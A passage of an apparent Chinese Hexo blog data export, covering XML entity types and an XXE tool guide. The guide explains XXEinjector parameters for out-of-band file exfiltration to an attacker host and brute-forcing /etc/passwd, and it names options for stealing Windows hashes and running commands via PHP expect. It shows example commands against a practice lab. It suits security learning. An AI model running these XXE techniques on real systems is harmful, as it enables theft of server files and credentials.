class=\"meta\">&lt;!DOCTYPE note [    </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note ANY&gt;   </span></span><br><span class=\"line\"><span class=\"meta\">  </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY entity1 SYSTEM \"http://www.sakuxa.com/example.xml\"&gt;  #system关键字表示外部引用</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span> &amp;entity1;<span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>iii.参数实体</p>\n<p>参数实体只用于 DTD 和文档的内部子集中。只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。</p>\n<p><strong>记住：%entity; 会被它指向的数据进行直接替换。</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note ANY&gt;   </span></span><br><span class=\"line\"><span class=\"meta\">  </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY % entity1 SYSTEM \"http://www.sakuxa.com/example.dtd\"&gt;</span></span><br><span class=\"line\"><span class=\"meta\">  %entity1  #会被example.dtd内容替换</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span> &amp;entity2;<span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>example.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY entity2 &quot;Be back.&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>注意：</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>"},{"title":"XXE漏洞利用工具及其资源","date":"2019-03-04T08:02:01.000Z","_content":"\n## 一、XXE Payload Cheatsheet\n\nhttps://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html\n\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection\n\n## 二、XXEinjector工具\n\n### 0x00 XXEinjector概述\n\nXXEinjector 是一款XXE Fuzz漏洞利用工具。\n\nXXEinjector 用于检索（爆破）存在XXE漏洞的目标服务器的文件或目录。\n\nXXEinjector 可以使用直接检索和带外的方式。\n\n<!-- more -->\n\nXXEinjector 的目录遍历（`--path`）只能用于Java应用程序。其他类型的应用程序只能使用爆破（`--brute`）的方法。\n\n带外方式要求目标主机可以访问我们指定的主机（`--host`），因为采用带外方式时目标主机需要从我们指定的IP上获取恶意dtd文件，以及会将检索到的文件以FTP传输的方式传输到该IP上。（XXEinjector会自动运行WEB服务以及恶意dtd文件以及FTP服务器。）\n\n工具地址：https://github.com/enjoiz/XXEinjector\n\n### 0x01 基本重要参数使用方法\n\n`--file`：这个参数是必选项，用于指定一个HTTP Request消息的文件。HTTP请求文件中要包含XML，或者可以使用\"XXEINJECT\"来标记注入点。\n\n> ```http\n> POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1\n> Host: 192.168.199.111\n> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0\n> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n> Accept-Encoding: gzip, deflate\n> Referer: http://192.168.199.111/pikachu/vul/xxe/xxe_1.php\n> Content-Type: application/x-www-form-urlencoded\n> Content-Length: 30\n> Connection: close\n> Upgrade-Insecure-Requests: 1\n> \n> xml=XXEINJECT&submit=%E6%8F%90%E4%BA%A4\n> ```\n\n`--path`：指定要遍历的目录或文件。遍历目录只适用于Java应用程序。若是单一文件，则哪种程序都可以用。爆破文件则应使用参数`--brute`。\n\n> `--path=/etc`\n>\n> `--path=s://test.txt`\n\n`--brute`：该选项用于爆破文件，用于指定包含`文件路径`的字典文件。结果在`brute.log`文件中。\n\n> ```\n> s://test.txt\n> s://test1.txt\n> /etc/passwd\n> ```\n\n**工具包含直接和带外两种检索文件的方式。**\n\n**默认是带外方式：**\n\n`--oob=ftp/http/gopher`：带外方式提供ftp(默认)、http、gopher三种协议。\n\n> - ftp协议适用于任意类型WEB程序。\n> - http、gopher协议只适用于Java < 1.7的Java WEB应用程序。\n\n`--host`：采用带外方式时，必选项。用于指定反连接IP。目标主机会从该IP获取恶意dtd文件，以及会将我们要获取的文件发到该IP的ftp上。\n\n`--httpport`：`--host`指定的主机监听的WEB服务端口。默认80\n\n`--ftpport`：`--host`指定的主机监听的FTP服务端口。默认21\n\n**直接方式**\n\n`--direct`：表示采用直接方式。还需要用一个独特的字符串作为该参数的值，具体看参数解释。\n\n**其他参数：**\n\n`--verbose`：显示详细信息，可以显示攻击数据包等。推荐使用。\n\n`--phpfilter`：使用PHP filter对检索文件进行Base64编码。\n\n`--ssl`：用于https站点。\n\n`--expect`：使用 PHP expect 扩展执行系统命令。\n\n`--output`：`--brute`输出结果保留的文件。\n\n### 0x03 使用实例\n\n- `ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --path=s://test.txt --verbose --phpfilter`\n\n> 结果在Logs\\IP\\目录下。\n\n- `ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --brute=filepath.txt --verbose --phpfilter --ssl`\n\n> 结果在brute.log文件中。\n\n```\n--host\t    必选项 - our IP address for reverse connections. (--host=192.168.0.2)\n--file\t    必选项 - 包含XML的HTTP Request文件。你也可以在请求文件中用\"XXEINJECT\"来标记的注入点。                      (--file=/tmp/req.txt)\n\n--path\t    如果要枚举目录，这是必选项 - 要枚举的目录路径。 (--path=/etc)\n--brute\t    如果要枚举文件，这是必选项 - 包含要枚举的文件路径的字典文件。 (--brute=/tmp/brute.txt)\n--logger    Log results only. Do not send requests. HTTP logger looks for \"p\" parameter with             results.\n  \n--rhost\t    目标主机的IP或者域名. 只有在Request文件中没用HOST头部时才使用. (--rhost=192.168.0.3)\n--rport\t    目标主机的端口. 只有在Request文件中没用HOST头部时才使用，没有默认值. (--rport=8080)\n\n--oob\t    带外漏洞利用方法. FTP是默认的方法且FTP可以用于任意WEB程序中.HTTP只能用于爆破Java < 1.7             的WEB程序的文件或目录. Gopher只能用于爆破Java < 1.7的WEB程序的文件或目录. (--                     oob=http/ftp/gopher)\n\n--direct\t直接利用漏洞而不是带外方法. Unique mark should be specified as a value for this                 argument. This mark specifies where results of XXE start and end. Specify --xml               to see how XML in request file should look like. (--direct=UNIQUEMARK)\n\n--cdata\t    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB               is used to construct CDATA payload. Specify --cdata-xml to see how request should             look like in this technique.\n\n--2ndfile\tFile containing valid HTTP request used in second order exploitation. \n\t\t\t(--2ndfile=/tmp/2ndreq.txt)\n\n--phpfilter\t使用PHP filter对文件进行Base64编码.\n--netdoc    使用netdoc协议而不是file协议。 (Java).\n--enumports\tEnumerating unfiltered ports for reverse connection. Specify value \"all\" to     \t\t\tenumerate all TCP ports. (--enumports=21,22,80,443,445)\n\n--hashes\t窃取Windows哈希值.\n--expect\t使用 PHP expect 扩展执行系统命令. (--expect=ls)\n--upload\tUploads specified file using Java jar schema into temp file. (--                              upload=/tmp/upload.txt)\n\n--xslt\t    Tests for XSLT injection.\n\n--ssl\t    Use SSL.\n--proxy\t    Proxy to use. (--proxy=127.0.0.1:8080)\n--httpport\t   Set custom HTTP port. (--httpport=80)\n--ftpport\t   Set custom FTP port. (--ftpport=21)\n--gopherport   Set custom gopher port. (--gopherport=70)\n--jarport\t   Set custom port for uploading files using jar. (--jarport=1337)\n--xsltport\t   Set custom port for XSLT injection test. (--xsltport=1337)\n\n--test\t    该参数用于测试校验Payload。会将发送的Payload显示出来而不会发送到目标主机。\n\n--urlencode\tURL encode injected DTD. This is default for URI.\n--nodtd\t     该参数用于想使用自己提供的dtd文件时，工具默认会生成并使用dtd文件。使用\"--dtd\"可以看dtd              文件格式。\n\n--output\t爆破的结果输出到的文件。 默认情况下爆破的结果存放在brute.log文件中\n\t\t\t(--output=/tmp/out.txt)\n\n--timeout\t    Timeout for receiving file/directory content. (--timeout=20)\n--contimeout\tTimeout for closing connection with server. This is used to prevent DoS                        condition. (--contimeout=20)\n\n--fast\t    Skip asking what to enumerate. Prone to false-positives.\n--verbose\t    Show verbose messages.\n```\n\n## 0x03 XXE学习资源\n\nhttps://nosec.org/home/detail/2139.html","source":"_posts/xxe-tool.md","raw":"---\ntitle: XXE漏洞利用工具及其资源\ndate: 2019-03-04 16:02:01\ntags: \n\t- Tools\n\t- Payload\n\t- Cheatsheet\n\t- XXE\ncategories:\n\t- WEB漏洞学习\n---\n\n## 一、XXE Payload Cheatsheet\n\nhttps://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html\n\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection\n\n## 二、XXEinjector工具\n\n### 0x00 XXEinjector概述\n\nXXEinjector 是一款XXE Fuzz漏洞利用工具。\n\nXXEinjector 用于检索（爆破）存在XXE漏洞的目标服务器的文件或目录。\n\nXXEinjector 可以使用直接检索和带外的方式。\n\n<!-- more -->\n\nXXEinjector 的目录遍历（`--path`）只能用于Java应用程序。其他类型的应用程序只能使用爆破（`--brute`）的方法。\n\n带外方式要求目标主机可以访问我们指定的主机（`--host`），因为采用带外方式时目标主机需要从我们指定的IP上获取恶意dtd文件，以及会将检索到的文件以FTP传输的方式传输到该IP上。（XXEinjector会自动运行WEB服务以及恶意dtd文件以及FTP服务器。）\n\n工具地址：https://github.com/enjoiz/XXEinjector\n\n### 0x01 基本重要参数使用方法\n\n`--file`：这个参数是必选项，用于指定一个HTTP Request消息的文件。HTTP请求文件中要包含XML，或者可以使用\"XXEINJECT\"来标记注入点。\n\n> ```http\n> POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1\n> Host: 192.168.199.111\n> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0\n> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n> Accept-Encoding: gzip, deflate\n> Referer: http://192.168.199.111/pikachu/vul/xxe/xxe_1.php\n> Content-Type: application/x-www-form-urlencoded\n> Content-Length: 30\n> Connection: close\n> Upgrade-Insecure-Requests: 1\n> \n> xml=XXEINJECT&submit=%E6%8F%90%E4%BA%A4\n> ```\n\n`--path`：指定要遍历的目录或文件。遍历目录只适用于Java应用程序。若是单一文件，则哪种程序都可以用。爆破文件则应使用参数`--brute`。\n\n> `--path=/etc`\n>\n> `--path=s://test.txt`\n\n`--brute`：该选项用于爆破文件，用于指定包含`文件路径`的字典文件。结果在`brute.log`文件中。\n\n> ```\n> s://test.txt\n> s://test1.txt\n> /etc/passwd\n> ```\n\n**工具包含直接和带外两种检索文件的方式。**\n\n**默认是带外方式：**\n\n`--oob=ftp/http/gopher`：带外方式提供ftp(默认)、http、gopher三种协议。\n\n> - ftp协议适用于任意类型WEB程序。\n> - http、gopher协议只适用于Java < 1.7的Java WEB应用程序。\n\n`--host`：采用带外方式时，必选项。用于指定反连接IP。目标主机会从该IP获取恶意dtd文件，以及会将我们要获取的文件发到该IP的ftp上。\n\n`--httpport`：`--host`指定的主机监听的WEB服务端口。默认80\n\n`--ftpport`：`--host`指定的主机监听的FTP服务端口。默认21\n\n**直接方式**\n\n`--direct`：表示采用直接方式。还需要用一个独特的字符串作为该参数的值，具体看参数解释。\n\n**其他参数：**\n\n`--verbose`：显示详细信息，可以显示攻击数据包等。推荐使用。\n\n`--phpfilter`：使用PHP filter对检索文件进行Base64编码。\n\n`--ssl`：用于https站点。\n\n`--expect`：使用 PHP expect 扩展执行系统命令。\n\n`--output`：`--brute`输出结果保留的文件。\n\n### 0x03 使用实例\n\n- `ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --path=s://test.txt --verbose --phpfilter`\n\n> 结果在Logs\\IP\\目录下。\n\n- `ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --brute=filepath.txt --verbose --phpfilter --ssl`\n\n> 结果在brute.log文件中。\n\n```\n--host\t    必选项 - our IP address for reverse connections. (--host=192.168.0.2)\n--file\t    必选项 - 包含XML的HTTP Request文件。你也可以在请求文件中用\"XXEINJECT\"来标记的注入点。                      (--file=/tmp/req.txt)\n\n--path\t    如果要枚举目录，这是必选项 - 要枚举的目录路径。 (--path=/etc)\n--brute\t    如果要枚举文件，这是必选项 - 包含要枚举的文件路径的字典文件。 (--brute=/tmp/brute.txt)\n--logger    Log results only. Do not send requests. HTTP logger looks for \"p\" parameter with             results.\n  \n--rhost\t    目标主机的IP或者域名. 只有在Request文件中没用HOST头部时才使用. (--rhost=192.168.0.3)\n--rport\t    目标主机的端口. 只有在Request文件中没用HOST头部时才使用，没有默认值. (--rport=8080)\n\n--oob\t    带外漏洞利用方法. FTP是默认的方法且FTP可以用于任意WEB程序中.HTTP只能用于爆破Java < 1.7             的WEB程序的文件或目录. Gopher只能用于爆破Java < 1.7的WEB程序的文件或目录. (--                     oob=http/ftp/gopher)\n\n--direct\t直接利用漏洞而不是带外方法. Unique mark should be specified as a value for this                 argument. This mark specifies where results of XXE start and end. Specify --xml               to see how XML in request file should look like. (--direct=UNIQUEMARK)\n\n--cdata\t    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB               is used to construct CDATA payload. Specify --cdata-xml to see how request should             look like in this technique.\n\n--2ndfile\tFile containing valid HTTP request used in second order exploitation. \n\t\t\t(--2ndfile=/tmp/2ndreq.txt)\n\n--phpfilter\t使用PHP filter对文件进行Base64编码.\n--netdoc    使用netdoc协议而不是file协议。 (Java).\n--enumports\tEnumerating unfiltered ports for reverse connection. Specify value \"all\" to     \t\t\tenumerate all TCP ports. (--enumports=21,22,80,443,445)\n\n--hashes\t窃取Windows哈希值.\n--expect\t使用 PHP expect 扩展执行系统命令. (--expect=ls)\n--upload\tUploads specified file using Java jar schema into temp file. (--                              upload=/tmp/upload.txt)\n\n--xslt\t    Tests for XSLT injection.\n\n--ssl\t    Use SSL.\n--proxy\t    Proxy to use. (--proxy=127.0.0.1:8080)\n--httpport\t   Set custom HTTP port. (--httpport=80)\n--ftpport\t   Set custom FTP port. (--ftpport=21)\n--gopherport   Set custom gopher port. (--gopherport=70)\n--jarport\t   Set custom port for uploading files using jar. (--jarport=1337)\n--xsltport\t   Set custom port for XSLT injection test. (--xsltport=1337)\n\n--test\t    该参数用于测试校验Payload。会将发送的Payload显示出来而不会发送到目标主机。\n\n--urlencode\tURL encode injected DTD. This is default for URI.\n--nodtd\t     该参数用于想使用自己提供的dtd文件时，工具默认会生成并使用dtd文件。使用\"--dtd\"可以看dtd              文件格式。\n\n--output\t爆破的结果输出到的文件。 默认情况下爆破的结果存放在brute.log文件中\n\t\t\t(--output=/tmp/out.txt)\n\n--timeout\t    Timeout for receiving file/directory content. (--timeout=20)\n--contimeout\tTimeout for closing connection with server. This is used to prevent DoS                        condition. (--contimeout=20)\n\n--fast\t    Skip asking what to enumerate. Prone to false-positives.\n--verbose\t    Show verbose messages.\n```\n\n## 0x03 XXE学习资源\n\nhttps://nosec.org/home/detail/2139.html","slug":"xxe-tool","published":1,"updated":"2019-03-22T03:58:09.064Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83l7002u7or0pa68fkqt","content":"<h2 id=\"一、XXE-Payload-Cheatsheet\"><a href=\"#一、XXE-Payload-Cheatsheet\" class=\"headerlink\" title=\"一、XXE Payload Cheatsheet\"></a>一、XXE Payload Cheatsheet</h2><p><a href=\"https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html\" target=\"_blank\" rel=\"noopener\">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a></p>\n<p><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection\" target=\"_blank\" rel=\"noopener\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a></p>\n<h2 id=\"二、XXEinjector工具\"><a href=\"#二、XXEinjector工具\" class=\"headerlink\" title=\"二、XXEinjector工具\"></a>二、XXEinjector工具</h2><h3 id=\"0x00-XXEinjector概述\"><a href=\"#0x00-XXEinjector概述\" class=\"headerlink\" title=\"0x00 XXEinjector概述\"></a>0x00 XXEinjector概述</h3><p>XXEinjector 是一款XXE Fuzz漏洞利用工具。</p>\n<p>XXEinjector 用于检索（爆破）存在XXE漏洞的目标服务器的文件或目录。</p>\n<p>XXEinjector 可以使用直接检索和带外的方式。</p>\n<a id=\"more\"></a>\n<p>XXEinjector 的目录遍历（<code>--path</code>）只能用于Java应用程序。其他类型的应用程序只能使用爆破（<code>--brute</code>）的方法。</p>\n<p>带外方式要求目标主机可以访问我们指定的主机（<code>--host</code>），因为采用带外方式时目标主机需要从我们指定的IP上获取恶意dtd文件，以及会将检索到的文件以FTP传输的方式传输到该IP上。（XXEinjector会自动运行WEB服务以及恶意dtd文件以及FTP服务器。）</p>\n<p>工具地址：<a href=\"https://github.com/enjoiz/XXEinjector\" target=\"_blank\" rel=\"noopener\">https://github.com/enjoiz/XXEinjector</a></p>\n<h3 id=\"0x01-基本重要参数使用方法\"><a href=\"#0x01-基本重要参数使用方法\" class=\"headerlink\" title=\"0x01 基本重要参数使用方法\"></a>0x01 基本重要参数使用方法</h3><p><code>--file</code>：这个参数是必选项，用于指定一个HTTP Request消息的文件。HTTP请求文件中要包含XML，或者可以使用”XXEINJECT”来标记注入点。</p>\n<blockquote>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1</span><br><span class=\"line\">&gt; Host: 192.168.199.111</span><br><span class=\"line\">&gt; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class=\"line\">&gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">&gt; Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">&gt; Accept-Encoding: gzip, deflate</span><br><span class=\"line\">&gt; Referer: http://192.168.199.111/pikachu/vul/xxe/xxe_1.php</span><br><span class=\"line\">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">&gt; Content-Length: 30</span><br><span class=\"line\">&gt; Connection: close</span><br><span class=\"line\">&gt; Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; xml=XXEINJECT&amp;submit=%E6%8F%90%E4%BA%A4</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><code>--path</code>：指定要遍历的目录或文件。遍历目录只适用于Java应用程序。若是单一文件，则哪种程序都可以用。爆破文件则应使用参数<code>--brute</code>。</p>\n<blockquote>\n<p><code>--path=/etc</code></p>\n<p><code>--path=s://test.txt</code></p>\n</blockquote>\n<p><code>--brute</code>：该选项用于爆破文件，用于指定包含<code>文件路径</code>的字典文件。结果在<code>brute.log</code>文件中。</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; s://test.txt</span><br><span class=\"line\">&gt; s://test1.txt</span><br><span class=\"line\">&gt; /etc/passwd</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>工具包含直接和带外两种检索文件的方式。</strong></p>\n<p><strong>默认是带外方式：</strong></p>\n<p><code>--oob=ftp/http/gopher</code>：带外方式提供ftp(默认)、http、gopher三种协议。</p>\n<blockquote>\n<ul>\n<li>ftp协议适用于任意类型WEB程序。</li>\n<li>http、gopher协议只适用于Java &lt; 1.7的Java WEB应用程序。</li>\n</ul>\n</blockquote>\n<p><code>--host</code>：采用带外方式时，必选项。用于指定反连接IP。目标主机会从该IP获取恶意dtd文件，以及会将我们要获取的文件发到该IP的ftp上。</p>\n<p><code>--httpport</code>：<code>--host</code>指定的主机监听的WEB服务端口。默认80</p>\n<p><code>--ftpport</code>：<code>--host</code>指定的主机监听的FTP服务端口。默认21</p>\n<p><strong>直接方式</strong></p>\n<p><code>--direct</code>：表示采用直接方式。还需要用一个独特的字符串作为该参数的值，具体看参数解释。</p>\n<p><strong>其他参数：</strong></p>\n<p><code>--verbose</code>：显示详细信息，可以显示攻击数据包等。推荐使用。</p>\n<p><code>--phpfilter</code>：使用PHP filter对检索文件进行Base64编码。</p>\n<p><code>--ssl</code>：用于https站点。</p>\n<p><code>--expect</code>：使用 PHP expect 扩展执行系统命令。</p>\n<p><code>--output</code>：<code>--brute</code>输出结果保留的文件。</p>\n<h3 id=\"0x03-使用实例\"><a href=\"#0x03-使用实例\" class=\"headerlink\" title=\"0x03 使用实例\"></a>0x03 使用实例</h3><ul>\n<li><code>ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --path=s://test.txt --verbose --phpfilter</code></li>\n</ul>\n<blockquote>\n<p>结果在Logs\\IP\\目录下。</p>\n</blockquote>\n<ul>\n<li><code>ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --brute=filepath.txt --verbose --phpfilter --ssl</code></li>\n</ul>\n<blockquote>\n<p>结果在brute.log文件中。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--host\t    必选项 - our IP address for reverse connections. (--host=192.168.0.2)</span><br><span class=\"line\">--file\t    必选项 - 包含XML的HTTP Request文件。你也可以在请求文件中用&quot;XXEINJECT&quot;来标记的注入点。                      (--file=/tmp/req.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--path\t    如果要枚举目录，这是必选项 - 要枚举的目录路径。 (--path=/etc)</span><br><span class=\"line\">--brute\t    如果要枚举文件，这是必选项 - 包含要枚举的文件路径的字典文件。 (--brute=/tmp/brute.txt)</span><br><span class=\"line\">--logger    Log results only. Do not send requests. HTTP logger looks for &quot;p&quot; parameter with             results.</span><br><span class=\"line\">  </span><br><span class=\"line\">--rhost\t    目标主机的IP或者域名. 只有在Request文件中没用HOST头部时才使用. (--rhost=192.168.0.3)</span><br><span class=\"line\">--rport\t    目标主机的端口. 只有在Request文件中没用HOST头部时才使用，没有默认值. (--rport=8080)</span><br><span class=\"line\"></span><br><span class=\"line\">--oob\t    带外漏洞利用方法. FTP是默认的方法且FTP可以用于任意WEB程序中.HTTP只能用于爆破Java &lt; 1.7             的WEB程序的文件或目录. Gopher只能用于爆破Java &lt; 1.7的WEB程序的文件或目录. (--                     oob=http/ftp/gopher)</span><br><span class=\"line\"></span><br><span class=\"line\">--direct\t直接利用漏洞而不是带外方法. Unique mark should be specified as a value for this                 argument. This mark specifies where results of XXE start and end. Specify --xml               to see how XML in request file should look like. (--direct=UNIQUEMARK)</span><br><span class=\"line\"></span><br><span class=\"line\">--cdata\t    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB               is used to construct CDATA payload. Specify --cdata-xml to see how request should             look like in this technique.</span><br><span class=\"line\"></span><br><span class=\"line\">--2ndfile\tFile containing valid HTTP request used in second order exploitation. </span><br><span class=\"line\">\t\t\t(--2ndfile=/tmp/2ndreq.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--phpfilter\t使用PHP filter对文件进行Base64编码.</span><br><span class=\"line\">--netdoc    使用netdoc协议而不是file协议。 (Java).</span><br><span class=\"line\">--enumports\tEnumerating unfiltered ports for reverse connection. Specify value &quot;all&quot; to     \t\t\tenumerate all TCP ports. (--enumports=21,22,80,443,445)</span><br><span class=\"line\"></span><br><span class=\"line\">--hashes\t窃取Windows哈希值.</span><br><span class=\"line\">--expect\t使用 PHP expect 扩展执行系统命令. (--expect=ls)</span><br><span class=\"line\">--upload\tUploads specified file using Java jar schema into temp file. (--                              upload=/tmp/upload.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--xslt\t    Tests for XSLT injection.</span><br><span class=\"line\"></span><br><span class=\"line\">--ssl\t    Use SSL.</span><br><span class=\"line\">--proxy\t    Proxy to use. (--proxy=127.0.0.1:8080)</span><br><span class=\"line\">--httpport\t   Set custom HTTP port. (--httpport=80)</span><br><span class=\"line\">--ftpport\t   Set custom FTP port. (--ftpport=21)</span><br><span class=\"line\">--gopherport   Set custom gopher port. (--gopherport=70)</span><br><span class=\"line\">--jarport\t   Set custom port for uploading files using jar. (--jarport=1337)</span><br><span class=\"line\">--xsltport\t   Set custom port for XSLT injection test. (--xsltport=1337)</span><br><span class=\"line\"></span><br><span class=\"line\">--test\t    该参数用于测试校验Payload。会将发送的Payload显示出来而不会发送到目标主机。</span><br><span class=\"line\"></span><br><span class=\"line\">--urlencode\tURL encode injected DTD. This is default for URI.</span><br><span class=\"line\">--nodtd\t     该参数用于想使用自己提供的dtd文件时，工具默认会生成并使用dtd文件。使用&quot;--dtd&quot;可以看dtd              文件格式。</span><br><span class=\"line\"></span><br><span class=\"line\">--output\t爆破的结果输出到的文件。 默认情况下爆破的结果存放在brute.log文件中</span><br><span class=\"line\">\t\t\t(--output=/tmp/out.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--timeout\t    Timeout for receiving file/directory content. (--timeout=20)</span><br><span class=\"line\">--contimeout\tTimeout for closing connection with server. This is used to prevent DoS                        condition. (--contimeout=20)</span><br><span class=\"line\"></span><br><span class=\"line\">--fast\t    Skip asking what to enumerate. Prone to false-positives.</span><br><span class=\"line\">--verbose\t    Show verbose messages.</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x03-XXE学习资源\"><a href=\"#0x03-XXE学习资源\" class=\"headerlink\" title=\"0x03 XXE学习资源\"></a>0x03 XXE学习资源</h2><p><a href=\"https://nosec.org/home/detail/2139.html\" target=\"_blank\" rel=\"noopener\">https://nosec.org/home/detail/2139.html</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、XXE-Payload-Cheatsheet\"><a href=\"#一、XXE-Payload-Cheatsheet\" class=\"headerlink\" title=\"一、XXE Payload Cheatsheet\"></a>一、XXE Payload Cheatsheet</h2><p><a href=\"https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html\" target=\"_blank\" rel=\"noopener\">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a></p>\n<p><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection\" target=\"_blank\" rel=\"noopener\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a></p>\n<h2 id=\"二、XXEinjector工具\"><a href=\"#二、XXEinjector工具\" class=\"headerlink\" title=\"二、XXEinjector工具\"></a>二、XXEinjector工具</h2><h3 id=\"0x00-XXEinjector概述\"><a href=\"#0x00-XXEinjector概述\" class=\"headerlink\" title=\"0x00 XXEinjector概述\"></a>0x00 